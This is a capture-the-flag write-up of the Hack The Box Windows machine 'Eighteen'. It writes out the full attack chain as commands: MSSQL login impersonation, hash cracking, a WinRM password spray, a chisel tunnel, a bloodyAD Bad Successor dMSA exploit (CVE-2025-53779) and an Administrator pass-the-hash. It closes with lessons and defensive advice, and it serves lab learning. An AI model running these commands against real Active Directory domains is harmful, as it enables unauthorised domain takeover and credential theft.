# Eighteen — Hack The Box, Easy, Windows

**TL;DR:** A MSSQL login-impersonation grant opens the application database, where
the web admin's password hash cracks to a weak password; that password is reused
by a domain user with WinRM access, and the Windows Server 2025 "Bad Successor"
dMSA flaw (CVE-2025-53779) turns that foothold into Domain Admin.

Assume-breach box: you start with a SQL Server login `kevin / iNa2we6haRj2gaw!`.

## Recon

A full TCP scan returns only three ports, and that shape is the first clue:

```
$ nmap -Pn -p- 10.129.x.x
80/tcp   open  http     Microsoft IIS httpd 10.0   -> http://eighteen.htb/
1433/tcp open  ms-sql-s Microsoft SQL Server 2022
5985/tcp open  wsman    (WinRM)
```

Everything else — 88, 135, 139, 389, 445 — is filtered inbound, and only UDP 53
(DNS) answers besides. This is a domain controller (it names itself `DC01` in the
`eighteen.htb` domain) whose firewall deliberately funnels you through MSSQL and
WinRM. When a DC hides its AD ports and leaves an application service exposed,
that service is the intended door.

The provided `kevin` is **not** a domain account: WinRM auth fails, and once inside
SQL `SUSER_SID('EIGHTEEN\kevin')` returns NULL. It is a local **SQL login**
(`netexec mssql 10.129.x.x -u kevin -p '...' --local-auth` succeeds).

## Enumeration

Connecting with `mssqlclient`, `kevin` lands as `guest` and is not `sysadmin`, so
no `xp_cmdshell`. Two things stand out from the login/permission enumeration:

- there is one non-default database, `financial_planner` (the web app's), which
  `kevin` cannot read; and
- `kevin` is granted **`IMPERSONATE` on the `appdev` login**.

That impersonation grant is the pivot. `appdev` is the account the web app uses,
and it can read the application database.

## Foothold: impersonate, crack, spray

Switch to `appdev` and read the app's user table:

```sql
EXECUTE AS LOGIN = 'appdev';
USE financial_planner;
SELECT username, password_hash, is_admin FROM dbo.users;
-- admin  pbkdf2:sha256:600000$AMtzteQIG7yAbZIa$0673ad90...c887133  1
```

That is a Werkzeug (Flask) PBKDF2-HMAC-SHA256 hash. hashcat mode 10900 wants it as
`sha256:iterations:base64(salt):base64(hash)`, so reformat it and crack with
rockyou:

```
sha256:600000:QU10enRlUUlHN3lBYlpJYQ==:BnOtkKC0r7GdZiM28Pzjqe3Qt7GRk3F74ozk1myIcTM=
-> iloveyou1
```

> **Trap worth naming.** `appdev` has *write* access to this table, so it is
> tempting to just `INSERT` your own `is_admin=1` row and log into `/admin`. It
> works — and it is a dead end. The admin panel only renders analytics; there is
> nothing behind it. The value is the *cracked password*, because it is reused
> elsewhere. Crack the hash; don't route around it.

The same MSSQL connection is enough to enumerate the domain. A RID-cycle over MSSQL
lists the domain users:

```
netexec mssql 10.129.x.x -u kevin -p 'iNa2we6haRj2gaw!' --local-auth --rid-brute
-> jamie.dunn, jane.smith, alice.jones, adam.scott, bob.brown, carol.white, dave.green
```

Spray the cracked password against those users over WinRM:

```
netexec winrm 10.129.x.x -u users.txt -p iloveyou1 --continue-on-success
-> eighteen.htb\adam.scott:iloveyou1 (Pwn3d!)
```

`adam.scott` reused the web-admin password and is a member of *Remote Management
Users*. That is a shell:

```
*Evil-WinRM* PS C:\Users\adam.scott\Desktop> type user.txt
<user flag redacted>
```

## Privilege escalation: Bad Successor (CVE-2025-53779)

Two facts decide the escalation. First, the domain and forest run at the **Windows
2025** functional level:

```
Get-ADDomain | Select DomainMode   # Windows2025Domain
```

Second, `adam.scott` is in `EIGHTEEN\IT`, and that group holds **CreateChild** over
`OU=Staff`. That combination is the precondition for **Bad Successor**, an abuse of
delegated Managed Service Accounts (dMSA), a feature introduced in Server 2025.
When a dMSA's `msDS-ManagedAccountPrecededByLink` points at another account and the
migration state is marked complete, the KDC issues the dMSA a ticket carrying the
*preceding* account's keys and group SIDs — and it never checks that the migration
was authorised. Point a dMSA at `Administrator` and the ticket hands you the
Administrator's keys.

The DC's AD ports are firewalled inbound, so pivot first: a reverse SOCKS tunnel
(chisel) run from the WinRM foothold exposes LDAP, Kerberos and SMB. Then, from
Linux through the tunnel:

```
bloodyAD --host dc01.eighteen.htb -d eighteen.htb -u adam.scott -p iloveyou1 \
    add badSuccessor pwn --ou "OU=Staff,DC=eighteen,DC=htb" --prepatch
```

`--prepatch` matters. Current tooling, by default, also writes `msDS-Superseded*`
attributes onto the *target* (Administrator) object — which `adam.scott` has no
right to do, so it fails with insufficient access. `--prepatch` writes only the
link on the dMSA you own, which is all this box needs. The returned dMSA TGT carries
the Administrator's keys under "previous keys":

```
dMSA previous keys ... RC4: <administrator NT hash>
```

That RC4 value is the Administrator NT hash. WinRM (5985) is open inbound, so
pass-the-hash straight in:

```
evil-winrm -i dc01.eighteen.htb -u administrator -H <administrator NT hash>
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
<root flag redacted>
```

Domain Admin.

## What did not work

- **Coercing the SQL service account and relaying it.** `kevin`/`appdev` can call
  `xp_dirtree` against a UNC path, which coerces the `EIGHTEEN\mssqlsvc` service
  account to authenticate to you — a real NetNTLMv2 capture. It goes nowhere. Every
  relay target is the *same host* the auth came from, so NTLM reflection plus
  SMB/LDAP signing (Server 2025 enforces LDAP channel binding) reject every attempt:
  LDAP, LDAPS, SMB and MSSQL relays all fail. On a single-host box, relaying a
  coerced local service account is a structural dead end.
- **Cracking `mssqlsvc`.** The captured NetNTLMv2 is not in rockyou or common lists,
  and a NetNTLMv1 downgrade is refused by the DC (it connects but sends no
  authenticate message), so there is no cheap route to its NT hash. This account is
  a decoy for the intended path.
- **`appdev`'s `xp_cmdshell` EXECUTE grant.** `appdev` can *execute* `xp_cmdshell`
  (unlike `kevin`), but it runs under a broken proxy credential (`LogonUserW` error
  1326), and a non-sysadmin cannot repair it. It looks like the intended RCE and is
  not.

Two or three hours of the above collapse into nothing the moment you go back and
*crack the admin hash* instead of admiring the SQL surface.

## Lessons

- A recovered password *hash* is a credential to crack, not merely an auth control
  to bypass. Bypassing the login (injecting an admin row) skips the one artifact —
  the reused plaintext — that the rest of the chain depends on.
- On a locked-down DC, the odd exposed service (here, SQL + WinRM only) is the design
  pointing at the path; coercion/relay rabbit holes are dead when every target is the
  same signing-protected host.
- On any Windows Server 2025 domain at the 2025 functional level, check Bad Successor
  early: *CreateChild* (or explicit dMSA-create) over any OU is a direct line to
  Domain Admin until CVE-2025-53779 is patched.

## Defensive takeaway

The control that breaks this chain earliest is **not reusing the application
password on a directory account**. The MSSQL impersonation and the crackable hash
only matter because `adam.scott` shares the web admin's password; sever that reuse
and the app foothold never becomes a domain foothold, and Bad Successor is never
reachable. Patching CVE-2025-53779 and stripping *CreateChild*/dMSA-create rights
from non-tier-0 principals removes the escalation independently — but password
hygiene is the cheaper, earlier fix, and it defends the whole class of app→AD
pivots rather than this one box.
